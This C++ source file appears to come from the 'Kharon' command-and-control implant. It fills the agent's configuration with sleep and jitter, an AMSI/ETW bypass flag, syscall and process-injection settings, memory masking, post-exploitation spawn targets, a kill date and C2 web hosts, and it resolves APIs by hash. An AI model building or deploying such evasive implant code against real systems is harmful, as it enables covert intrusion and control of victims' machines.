#include <Kharon.h>

auto DECLFN GetConfig( KHARON_CONFIG* Cfg ) -> VOID {
    G_KHARON

    //cfg
    Cfg->AgentId       = KH_AGENT_UUID;
    Cfg->SleepTime     = KH_SLEEP_TIME * 1000;
    Cfg->Jitter        = KH_JITTER;
    Cfg->BofProxy      = KH_BOF_HOOK_ENALED;
    Cfg->Syscall       = KH_SYSCALL;
    Cfg->AmsiEtwBypass = KH_AMSI_ETW_BYPASS;

    static BYTE ENCRYPT_KEY_ARRAY[] = KH_CRYPT_KEY;

    for ( int i = 0; i < 16 ; i++ ) {
        Cfg->EncryptKey[i] = ENCRYPT_KEY_ARRAY[i];
    }

    Cfg->Injection.StompModule = KH_STOMP_MODULE;
    Cfg->Injection.TechniqueId = KH_INJECTION_ID;

    // mask
    Cfg->Mask.Beacon = KH_SLEEP_MASK;
    Cfg->Mask.Heap   = KH_HEAP_MASK;

    // postex
    Cfg->Postex.Spawnto  = KH_SPAWNTO_X64;
    Cfg->Postex.ForkPipe = KH_FORK_PIPE_NAME;

    // worktime
    Cfg->Worktime.StartHour = KH_WORKTIME_START_HOUR;
    Cfg->Worktime.StartMin  = KH_WORKTIME_START_MIN;
    Cfg->Worktime.EndHour   = KH_WORKTIME_END_HOUR;
    Cfg->Worktime.EndMin    = KH_WORKTIME_END_MIN;

    Cfg->Worktime.Enabled = KH_WORKTIME_ENABLED;

    // killdate
    Cfg->KillDate.Day   = KH_KILLDATE_DAY;
    Cfg->KillDate.Month = KH_KILLDATE_MONTH;
    Cfg->KillDate.Year  = KH_KILLDATE_YEAR;

    Cfg->KillDate.SelfDelete = FALSE;
    Cfg->KillDate.ExitProc   = TRUE;
    Cfg->KillDate.Enabled    = KH_KILLDATE_ENABLED;

    // web
    static WCHAR* WEB_HOST_LIST[] = WEB_HOST;
    static INT32  WEB_PORT_LIST[] = WEB_PORT;
    static WCHAR* WEB_ENDP_LIST[] = WEB_ENDPOINT;

    Cfg->Web.HostQtt     = WEB_HOST_QTT;
    Cfg->Web.PortQtt     = WEB_PORT_QTT;
    Cfg->Web.EndpointQtt = WEB_ENDPOINT_QTT;

    auto AllocHeap = (PVOID (*)( PVOID, ULONG, SIZE_T ))LdrLoad::_Api( 
        LdrLoad::Module( Hsh::Str<CHAR>( "ntdll.dll" ) ), 
        Hsh::Str<CHAR>( "RtlAllocateHeap" ) 
    );

    // Allocate arrays
    Cfg->Web.Host     = (WCHAR**)AllocHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Cfg->Web.HostQtt     * sizeof( WCHAR* ) );
    Cfg->Web.Port     = (ULONG* )AllocHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Cfg->Web.PortQtt     * sizeof( ULONG  ) );
    Cfg->Web.EndPoint = (WCHAR**)AllocHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Cfg->Web.EndpointQtt * sizeof( WCHAR* ) );

    // Validate allocations
    if ( !Cfg->Web.Host || !Cfg->Web.Port || !Cfg->Web.EndPoint ) {
        return;
    }

    // Copy Host array
    for ( INT32 i = 0; i < Cfg->Web.HostQtt; i++ ) {
        Cfg->Web.Host[i] = WEB_HOST_LIST[i];
    }

    // Copy Port array
    for ( INT32 i = 0; i < Cfg->Web.PortQtt; i++ ) {
        Cfg->Web.Port[i] = WEB_PORT_LIST[i];
    }

    // Copy Endpoint array
    for ( INT32 i = 0; i < Cfg->Web.EndpointQtt; i++ ) {
        Cfg->Web.EndPoint[i] = WEB_ENDP_LIST[i];
    }
 
    Cfg->Web.UserAgent    = WEB_USER_AGENT;
    Cfg->Web.HttpHeaders  = WEB_HTTP_HEADERS;
    Cfg->Web.Method       = WEB_METHOD;
    // Cfg->Web.Cookies      = WEB_HTTP_COOKIES,
    Cfg->Web.ProxyUrl     = WEB_PROXY_URL;
    Cfg->Web.ProxyEnabled = WEB_PROXY_ENABLED;
    Cfg->Web.Secure       = WEB_SECURE_ENABLED;
}